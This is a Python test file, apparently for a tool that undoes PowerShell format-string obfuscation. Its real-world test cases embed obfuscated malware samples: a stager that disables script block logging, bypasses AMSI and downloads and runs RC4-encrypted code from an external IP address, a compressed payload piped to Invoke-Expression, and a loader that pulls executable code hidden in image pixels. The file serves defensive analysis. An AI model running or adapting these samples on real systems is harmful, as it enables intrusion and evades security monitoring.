from ... import TestUnitBase


class TestFormatString(TestUnitBase):

    def setUp(self):
        super().setUp()
        self.unit = self.load()

    def test_split_format_string(self):
        self.assertEqual(self.unit(BR'''"{0}$SEP{1}"-f 'Hello',"World"'''), B'"Hello${SEP}World"')

    def test_invalid_format(self):
        data = BR'''"{0}{2}{1}"-f 'Hello',"World"'''
        self.assertEqual(self.unit(data), data)

    def test_trivial(self):
        self.assertEqual(self.unit(BR""""{0}{2}{1}"-f 'signa','ures','t'"""), b'"signatures"')

    def test_all_single_quotes(self):
        self.assertEqual(self.unit(BR"""'{0}{2}{1}'-f 'signa','ures','t'"""), b'"signatures"')

    def test_mixed_quotes(self):
        self.assertEqual(self.unit(BR'''"{0}{2}{1}"-f 'signa','ures',"t"'''), b'"signatures"')

    def test_format_string_with_chars(self):
        self.assertEqual(self.unit(b'("{0}na{2}{1}"-f \'sig\',\'ures\',\'t\')'), b'("signatures")')

    def test_real_world_01(self):
        self.assertIn(b'http://131.255.5.65:80', self.unit(
            BR''' ( [TYPE]("{3}{14}{2}{6}{7}{10}{11}{1}{9}{5}{4}{0}{12}{13}{8}"-F'nG,sys','RY[','nS.','CoLL','I','TR','Ge','nErIc.d','bjECt','s','iCT','ioNa','TEM.','o','eCtIo') )  ;  .("{1}{2}{0}" -f 'TEm','Set','-i') ("{2}{0}{1}" -f 'iABle:jHGs','0','Var') ([TYPE]("{3}{0}{2}{1}"-f'CrI','K','PTBLOc','s')  ) ;  ^&("{1}{0}{2}"-f 'Et','S','-iTem') ("{0}{3}{2}{1}"-f 'VariA','0','E:e8','bL') ([TyPe]("{1}{0}"-F'F','RE'));    ${1`6j9}=
  [typE]("{2}{6}{8}{4}{7}{0}{5}{3}{1}"-f'Nt','GEr','system.N','aNa','ERViC','M','et.','epoI','S')  ; ${3`sR2} = [TYpE]("{2}{0}{3}{1}"-F 'STeM.NeT.W','equESt','SY','ebR')  ;    .('sv') ("{0}{1}" -f'dt37m','b') (  [tyPe]("{4}{6}{0}{1}{5}{3}{2}"-f'M.neT.Cr','eD','e','CAch','Sy','EnTIaL','ste')  )  ;   .("{0}{1}" -f'se','t') ('Ut2'+'i') ( [TYPE]("{4}{3}{2}{0}{1}"-f'm.TEXT.ENcODi','nG','e','T','SYS')  ); IF(${ps`VE`RsIoNtab`LE}."PsV`E`Rsi`On"."MaJ`OR" -GE 3){${G`Pf}= (  ^&("{3}{0}{1}{2}" -f'Et-VA','Ria','bLE','g') ("{1}{0}"-f'0','E8') -VALUEonLy )."ass`eM`BlY".("{2}{0}{1}" -f'TTY','Pe','GE').Invoke(("{1}{3}{6}{2}{4}{0}{5}" -f'on.Ut','Syst','to','em.Managem','mati','ils','ent.Au'))."GETFiE`ld"(("{2}{3}{4}{0}{1}{5}"-f 'cyS','ettin','c','ac','hedGroupPoli','gs'),'N'+("{4}{2}{1}{0}{3}" -f'ublic,S','P','n','tatic','o'));If(${G`Pf}){${G`Pc}=${g`pf}.("{0}{1}" -f 'G','ETVAlue').Invoke(${n`Ull});If(${g`pc}[("{0}{2}{1}" -f'Scri','tB','p')+("{2}{1}{0}"-f 'ing','ckLogg','lo')]){${G`PC}[("{1}{0}" -f 'ptB','Scri')+("{2}{0}{1}"-f 'kLoggi','ng','loc')][("{3}{1}{0}{2}" -f'p','leScri','tB','Enab')+("{1}{0}{2}" -f 'gin','lockLog','g')]=0;${G`Pc}[("{1}{0}"-f'ptB','Scri')+("{1}{0}{2}"-f'ckLog','lo','ging')][("{0}{5}{7}{4}{2}{1}{6}{3}" -f 'En','nvoc','lockI','gging','ptB','able','ationLo','Scri')]=0}${v`Al}=  ${Zh`ex}::("{1}{0}" -f 'eW','n').Invoke();${v`Al}.("{0}{1}" -f'Ad','D').Invoke(("{3}{1}{2}{0}" -f'riptB','bl','eSc','Ena')+("{3}{1}{2}{0}"-f'ng','c','kLoggi','lo'),0);${V`Al}.("{1}{0}"-f'd','Ad').Invoke(("{4}{5}{6}{1}{3}{2}{7}{0}"-f 'ing','ockInv','catio','o','EnableS','cr','iptBl','nLogg'),0);${G`pc}[((("{19}{1}{21}{22}{4}{3}{16}{24}{8}{17}{11}{10}{7}{18}{20}{6}{5}{12}{23}{9}{14}{15}{13}{2}{0}" -f 'B','Y','pt','EZ1m','_MACHIN','sZ1','1mWindow','i','areZ1mPolic','l','1mM','esZ','m','cri','lZ','1mS','S','i','crosof','HKE','tZ','_','LOCAL','PowerShe','oftw'))  -CrePLAcE  ([chAr]90+[chAr]49+[chAr]109),[chAr]92)+("{0}{3}{1}{2}"-f 'lo','ggin','g','ckLo')]=${V`AL}}ELse{  (  ^&("{0}{2}{3}{1}"-f 'gEt-','IAbLE','v','AR')  ("{1}{0}" -f'gS0','jH')  -va  )."GEtFiE`Ld"(("{0}{2}{1}"-f 'signa','ures','t'),'N'+("{0}{1}{2}{3}" -f'on','Public,S','ta','tic')).("{1}{0}{2}" -f 'TVa','SE','lue').Invoke(${nu`lL},(^&("{1}{0}{3}{2}" -f'Ew-','N','Ect','OBJ') ("{9}{6}{7}{1}{0}{4}{8}{3}{5}{2}" -f'eR','N','InG]','hSE','iC.HA','t[str','olLe','cTiONS.GE','S','C')))}  ( ^&("{0}{1}" -f 'VAR','IAbLe')  ("{1}{0}" -f'80','e'))."VAl`Ue"."aSSe`m`BLY".("{1}{2}{0}" -f'Pe','GETT','y').Invoke(("{7}{6}{2}{3}{9}{5}{1}{4}{0}{8}{10}" -f'on.Amsi','omat','ge','m','i','t','a','System.Man','Uti','ent.Au','ls'))^|.('?'){${_}}^|^&('%'){${_}.("{1}{0}{2}"-f 'FIEL','GEt','D').Invoke(("{3}{0}{1}{2}{4}"-f 'In','itFai','l','amsi','ed'),("{0}{2}{1}"-f'No','ic','nPublic,Stat')).("{0}{2}{1}" -f'S','VALUe','eT').Invoke(${N`Ull},${T`RuE})};};  ( ^&("{1}{0}"-f 'm','Ite')  ("v"+"Ar"+"IabLe:"+"16J9") )."v`ALue"::"E`xpe`Ct100`c`onti`Nue"=0;${Wc}=^&("{1}{2}{0}"-f 'T','NeW-','Objec') ("{5}{4}{0}{2}{6}{1}{3}"-f'WebC','n','L','T','NEt.','SYstEm.','ie');${u}=("{13}{0}{3}{1}{5}{10}{16}{2}{8}{12}{4}{6}{7}{11}{9}{15}{14}" -f'ozilla/',' (Wi','s ','5.0',';','n',' rv:1','1.0) ','NT 6.1; WOW64;','ke G','d','li',' Trident/7.0','M','ko','ec','ow');${Wc}."HEA`deRs".("{1}{0}"-f 'DD','A').Invoke(("{1}{0}{2}" -f'r-Age','Use','nt'),${u});${wC}."pR`oXY"= ( ^&("{2}{0}{1}"-f 'iAb','le','GET-vaR')  ("3"+"Sr2") )."va`lUe"::"Defa`U`Ltweb`PrOxy";${WC}."p`ROXy"."CR`E`dEnTI`AlS" =  (  ^&("{2}{1}{0}" -f 'teM','di','Chil') ("{1}{3}{2}{0}"-f'mb','varIaBLE:','T37','d')  )."V`Alue"::"dEfA`UL`TNeT`Wo`RKcredentiAls";${SC`R`ipT`:`PRoxy} = ${wc}."P`RoXy";${K}= (^&("{0}{1}" -f 'va','riabLe') ('Ut2'+'i') )."v`ALuE"::"a`SCIi".("{1}{2}{0}" -f'ES','G','ETBYT').Invoke(("{5}{1}{4}{0}{3}{2}" -f'c7aa','9acd','9ac5cd9c','0','1811','aede680d435'));${r}={${D},${k}=${aR`GS};${S}=0..255;0..255^|^&('%'){${j}=(${J}+${s}[${_}]+${K}[${_}%${k}."cou`NT"])%256;${S}[${_}],${S}[${J}]=${S}[${J}],${S}[${_}]};${d}^|.('%'){${I}=(${i}+1)%256;${H}=(${h}+${S}[${i}])%256;${s}[${I}],${S}[${h}]=${S}[${h}],${s}[${I}];${_}-bXOR${s}[(${s}[${i}]+${s}[${h}])%256]}};${S`eR}=("{4}{3}{2}{1}{5}{0}"-f '5:80','31.255','//1',':','http','.5.6');${t}=("{3}{0}{2}{1}" -f 'min/ge','p','t.ph','/ad');${Wc}."He`ADErs".("{1}{0}"-f'D','AD').Invoke(("{0}{2}{1}"-f'C','okie','o'),("{4}{2}{1}{0}{5}{3}{6}"-f 'P','=9lSc2HiKKJ0','sion','cFj6vBQukc','ses','j','ypvg='));${D`Ata}=${wC}.("{2}{0}{1}"-f 'aD','DATa','DOWnLo').Invoke(${S`ER}+${t});${i`V}=${da`Ta}[0..3];${D`Ata}=${D`AtA}[4..${D`Ata}."leN`GTH"];-JoIN[CHaR[]](^& ${r} ${d`ATa} (${iv}+${K}))^|.("{1}{0}" -f 'X','IE')'''
        ))

    def test_real_world_02(self):
        payload = B'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'
        self.assertIn(payload, self.unit(
            BR''' "\"(.("{1}{2}{0}" -f 'T','nE','W-objec') ("{6}{5}{0}{3}{2}{8}{1}{7}{4}" -f 'I', 'e', 'cOMPRESSION.', 'o.', 'TEsTREam', 'Ystem.', 'S', 'Fla', 'd')( [syStEm.Io.mEmorYstREam] [cONVeRt]::"Fr`om`BasE6`4sT`RiNg"(("{9}{41}{37}{28}{2}{92}{89}{75}{40}{33}{58}{94}{1}{17}{52}{49}{93}{59}{54}{64}{63}{45}{36}{70}{66}{15}{13}{22}{12}{65}{39}{61}{10}{7}{81}{87}{29}{95}{96}{79}{23}{44}{18}{71}{42}{20}{24}{82}{25}{69}{38}{30}{5}{0}{88}{97}{77}{78}{67}{55}{27}{62}{84}{48}{76}{90}{80}{21}{74}{31}{16}{56}{43}{47}{35}{11}{73}{72}{83}{19}{98}{57}{50}{53}{85}{32}{51}{46}{91}{6}{34}{26}{60}{4}{86}{8}{14}{3}{68}"-f
                'A5WT4Ysfzc','9qMq2pivVle3JZbbOIhBeFCyVDVxqqJvQkMViBROixQTBBEMga','4xVg3fZ78OUR9V8','X377s08+/PP7zeP348y/Tl0+P18','Z5TiLVA39KotEnX8m9JX/F2JO4awWO6','NIzLZMqznSDYjZsoP2Nr','+','BoYnCuEIfgVcnQyhezoy8RWTbgJDd3bnrDaUEYNHOsaiaNHYi0qJY3kdL7t','rXS0t3GdynTydk1V2TJd2anb','PZhbq+XGFYT/yn4wOefgxPS9g99ELshBxCYTUGAY9OAIWTDYMBz0kui/p77qPXnYsC+t7nWpqlW9H797vD6++TD/5fNy/vlj/PSt3u+flx/+/THmT9++/OvlTb+/Pl5KuGrYSzhjbGssdY6pr7U','nYbNCqyWgyTkLKcbshQVKGkSlFJKKP4lctGY7pV09RGmcBk9xOEfPrw9DUerU7aWnugknEHM','FwsjnxX','pEzOlhHQRv8IIEqQXycLCL+KGMtDzM0CvFxaLRVOmoasW','qPdOF2wglcTS4pcEh9GeqSh+zBvtS3UVfVDoWriXMOM72HFbIZl3RK6FK0JwDOU','KA9f48t2Hnz7/8M/Xl2s7pn2+l/V8eXv89/H','Q1p57l3CANSBlwdATNVj6VA92WbWnPwpgwm','Kp0ZqXIeMBDbnGhUo+GeY/wRrNRMi9GOj2','zPMO','z2ZNUgZi56','4wa8yHapYhvCWOAUvRgh3mat6TFlriK2i77VeEM3cBlVetPTe1E/cf5meCXnVUAP+PoUP1zbNxGWPygkzYxVCIak93mhJjLv9IH1fjZgd','mRgS3boLFcAgA','6tC4ecVgmY6A0LTMhqsFxLe+cxNJzkZLj','ElBW+PKk6','QacEfD2Va77NzwJrdQSTt850MI','N','fNc9WB05PN0egBR0oNgGVQ9y375QY9MY3RxH','GHPa6o005sv3HbIduw19RcFUFymUs7q4yWX/e7P7Kt7HPwDVfzkcvqwFcNuZ0x70X/8+0KGn/4Y4LIeJGnI3sS1e5aiUX+UeySx','ELK5eegfOLUxPoMZ4CF7DivQFwlszaf5CdlSu','JZa','E','hM','9fcKfZyWMAiDGqgzliJBU4Utz7NCg3OJF1Ufw4ELdmRG+TUg9xDBJGxNGOPNQt4e6PKMYB4','ucTgbleyy+qZM1D4Gbq4GPJ','TqA9/F2sEUHtLzrgM1bjMDvWOtZw6EAY86ce48s9ZZNKguIdNFDZ8xx9iat6Oykw+r+3GSKua7a4lRM2','Wk++j8YGw9RqG4C','r','9o2md0KIRzApojwNan5k1FSRIXO5iATwOatE1c+uu','sfY7ljTHmK4Yqt7nO6ZylrCVcMcYrxj7XdsdW15iK1NMadHC','zU','hO8fCypp97','o+j4pkqjTa59jbWdtuw4+tJkCa','u','6DVEJdwQvWu/lA7z7U2WSg1HgxSYFeEZU+GxOlAkwR3ArXMBCRR3BT39GIK3IOj2JQMfHn+IhLkoa','ZmBDqwogWBwqX7Trm69Y7X2Vi7kQHqG+R9whi+7ERtcfniXRDofNm5EXllhCKJ1XHcxnASGpAEWwqVnzycCyK7W','epq','dV1InkQm/GC8RoKiJBakmip','EpSW88JdEPGSRCkhF','6OLWcEYnXRlY+fICfl63iOEE','UOJA/','BNUs6E','gvkeKjAjT7V0BnEjFnYNRPWaSHZ3sFPSmHzd','R7KHOIMgHK98jAjgu2F21Nh','mo3vMKa1PpquKlVKFtPa7umKrYBJES56ZC','dxgcTT0W+6u7PyNpXH8rIECfxGK','UbgE3sKnms+KBE2UHGVqiiaRC0BUMxS5Uu5hqWArnE0tKWC5rW4+','6YN6k5vKEdYMcDJJ4qQTep','Wuga0w7/ocmcb+YfXe','bWQXMTQCk3','iruz3UjmFpdOBL','GrjGI4LS4/jia6XMNhUs8ie9WqkoUK3dhFSIxM93zLZbKry2oTTHK8W96YSk1Ysc1OLazzdljC6l3mU6iUV','5wi14au7OM9ThDEJ','vLuwSMaRnxoTYh7xqCv6Tp0VGoTip4xSRJ1bEQqEKgNPa','JuO','YVxEaeiGCjg5xLbKEAl1+N39yt3UkVBQWtg3AZVNjWD0','dctxil0Fou3EW7NO09aFlAUp90dZFTCtOia6CZYhjlABJBVVyNR2b5FGwQzzi6SoelO5UyMlUl','wWC2jl41gk3ZNlIpGq7','ZNQv','qcMtMKxRaavRz46M9ucYC/wNRK31J4BdEW92Y143i2yeJ6snixM4r4x5pDLjJUKw/IFcRtlqwzt/BQU6IeJ1W','fHP/3492v/8v7p++/ffzx/fY/t9fH6zfbd+28f3v9x/nq8vr09fv/Hx9vj7e1+e/zhb1rzeNFu/wM=','hEK9CRPvTFuaTJTYKISTuoFaq6Kt','pbjK3Ntapgzb1SbaGX9tHXoDOqwmFwwBk','ZQOJ2O8wYriHy8BSApmcLGJFViIs35XeieqwPQbU0YxNC5','N1PJNB','WK2hlm+2VUWpQ0bqfGFiWj','l4s4yccl5hNyh4sqvNk2CRNQ4ayDx','GlHolZ','f9/MWBCS0FV74AMMhKhplCBvFNnKFAwcysnDw','81Q9vAWuWUnmFWCMhOoevgulipLpHKtC+qdykAS','1rI+xZScS0eFFBi2rl4GrMcR0SkBLKpmm','UJ','Y1Z2PMoFHhMVxAU','i9VYlK9qdjFpFoglBbVS9LPRaQ2+Tso8','IFrV0yBGVzWUOg3XFhVQwe','AnSeR4TwXcKNYaco6+dNpC+qKaBbQEa2wloPa','yrS4TeOX09MgUJx00b0c6IHgQ6cirJxMoX7YZRFyG5YzDF9KW0pb','DMkLX1l','A88ga+9B/TQo1Q+mwvXyU7vnu','KqbDgrxCy8w','E1hhzA6HYjp4VSV66hqtUTSLRgqm3bw9DR38jMd9','owEkHatt0j32yfiparFjiodOWSoR51cpVJ+jEc','NlMIXB8tLsdg','ijIW7fRdjl7boNbt65yTkQNhwVL0HCAQyY7pev4bcY6ruDIXToexZ/lu32HQM9p8DxlJeXJ6','6xd1p82l6DFjX9wMI+1Xr','jXrm8tHS3r0DC1vlJLNYrjQ','U7pE4U2P7MzYVoBU9Uqeetq4SlkaSJHXqQR2gg0LUyswTR2sT61O+vD1NqDSgnTF05bIUglXhUpvdEtWfsrbGIrU2juRTWFqYdL4+','5cQAJhaLJw3vArTnX','T0t0NGSoQ0RiwpfHQSVSWbLahQF9BSp2YzgjCp1wgYiO9WqHnXCAdMxzBV5d3o68jCPwHtBiZ',
                    'mu2a6lB+/XbQGGiOmamMsbRZBLE+BQRrC0eI4sbNE5BEywjJjqL0veEU6/0UwsW9NwMxL0/RRN4G0SHGLJm3Oa24n','IO3wLU')),
                [syStEm.Io.CoMPressioN.COMprEssionmode]::"dECOm`p`RESs")
                |&("{1}{0}{2}"-f 'E','foR','aCh') { .("{2}{0}{1}" -f '-o','bjecT','nEW') ("{3}{2}{4}{0}{1}"-f 'm','reaDER','o.str','SYSTem.i','Ea')( `${_} , [sysTEM.tExT.enCODiNg]::"a`scII")} )."rEAd`ToEnD"( ) |&( `${VER`BOsE`pre`Fe`REnce}."tOS`TrIng"()[1,3]+'x'-JoiN'')"\" | &( $pshOme[21]+$pSHome[30]+'x')
            '''
        ))

    def test_real_world_03(self):
        result = self.unit(BR'''
            &("{1}{0}" -f 'l', 'sa') ("{0}{1}" -f 'e', 'ni') ("{3}{1}{0}{2}" -f 'w-Obj', 'e', 'ect', 'N'); .("{1}{0}" -f 'd-Type', 'Ad') -AssemblyName ("{3}{0}{1}{2}" -f 'em', '.Drawin', 'g', 'Syst'); ${Tm} = (&("{1}{3}{0}{2}" -f 'do', 'Ge', 'm', 't-Ran') ("{2}{3}{4}{1}{5}{0}{6}" -f 'HHD.', 'om3', 'h7', '7', '9s:334.4mgur.c', '6q5q', '9ng'), ("{7}{1}{2}{8}{6}{0}{5}{4}{3}{9}" -f 'om386', '77', '9s:3', '51', '03', '3a', '4mages2.4mgbox.c', 'h', '3', 'TUnraE_o.9ng'))."RepLa`cE"('3', '/'); ${T`m} = (${Tm}."re`pLaCE"('4', 'i'))."REp`LAcE"('9', 'p'); ${rY} = [System.Net.WebRequest]::"CR`eATE"(${T`m}."r`EPLa`Ce"('7', 't')); ${r`Y}."mE`ThOD" = ("{0}{1}" -f 'HEA', 'D'); ${RA} = ${R`Y}."GetR`E`SP`oNsE"(); ${fF} = ${RA}."coNteN`T`LE`NgtH"; if (${F`F} -ge 1000) {
                ${g} = .("{1}{0}" -f 'ni', 'e') ("{4}{2}{6}{3}{5}{1}{0}" -f 'ap', 'Bitm', 'em.Draw', 'ng', 'Syst', '.', 'i')((.("{1}{0}" -f 'ni', 'e') ("{1}{2}{0}" -f 'lient', 'Net.We', 'bC'))."OP`E`NreAD"(${t`m}."Re`pl`AcE"('7', 't'))); ${o} = &("{0}{1}" -f 'e', 'ni') ("{1}{2}{0}" -f 'e[]', 'B', 'yt') 46080; (0..95) | &('%') { foreach (${x} in(0..479)) {
                ${p} = ${g}."gET`PI`Xel"(${X}, ${_}); .("{1}{0}" -f 'al', 's') ('Eg') ("{1}{0}" -f 'X', 'Ie'); ${o}[${_} * 480 + ${X}] = ([math]::"flo`oR"((${P}."B"-band15) * 16)-bor(${P}."g"-band 15))
            } }; &('eg')('( N' + [System.Text.Encoding]::"u`Tf8"."ge`TS`T`RinG"(${o}[0..45996])); break;
        }''')
        for keyword in (B'System.Drawing', B'New-Object', B'Net.WebClient'):
            self.assertIn(keyword, result)

    def test_multiple_occurrences(self):
        self.assertEqual(
            self.unit(
                b'"{10}{1}{0}{5}{9}{7}{8}{7}{3}{6}{2}{7}{4}{4}{10}{5}{1}"'
                b"-f'v','n','r','x','s','o','p','e','-','k','i'"
            ),
            b'"invoke-expression"'
        )
